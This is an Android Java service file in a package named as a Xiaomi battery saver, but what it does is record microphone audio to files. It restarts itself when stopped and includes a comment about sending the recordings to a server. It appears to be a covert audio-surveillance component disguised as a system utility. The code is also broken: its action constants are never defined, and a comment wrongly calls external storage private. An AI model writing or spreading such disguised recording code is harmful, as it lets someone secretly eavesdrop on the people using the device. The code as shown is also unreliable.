package com.xiaomi.batterysaver.service;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.IBinder;
import androidx.annotation.Nullable;
import androidx.core.content.ContextCompat;
import android.content.pm.PackageManager;
import android.util.Log;
import java.io.File;
import java.io.IOException;

public class RecordService extends Service {
    private MediaRecorder mediaRecorder;
    private String outputFilePath;

    @Override
    public void onCreate() {
        super.onCreate();
        if (hasPermissions()) {
            setupMediaRecorder();
        }
    }

    private void setupMediaRecorder() {
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        // Save file in app's private storage
        File outputFile = new File(getExternalFilesDir(null), "audio_record_" + System.currentTimeMillis() + ".mp4");
        outputFilePath = outputFile.getAbsolutePath();
        mediaRecorder.setOutputFile(outputFilePath);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            final String action = intent.getAction();
            if (ACTION_START_RECORDING.equals(action)) {
                startRecording();
            } else if (ACTION_STOP_RECORDING.equals(action)) {
                stopRecording();
            }
        }
        return START_STICKY;
    }

    private void startRecording() {
        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
        } catch (IOException e) {
            Log.e("RecordService", "Error starting media recorder", e);
        }
    }

    private void stopRecording() {
        if (mediaRecorder != null) {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            // Here you can add the logic to send the file to your local server
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopRecording();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private boolean hasPermissions() {
        return ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
    }
}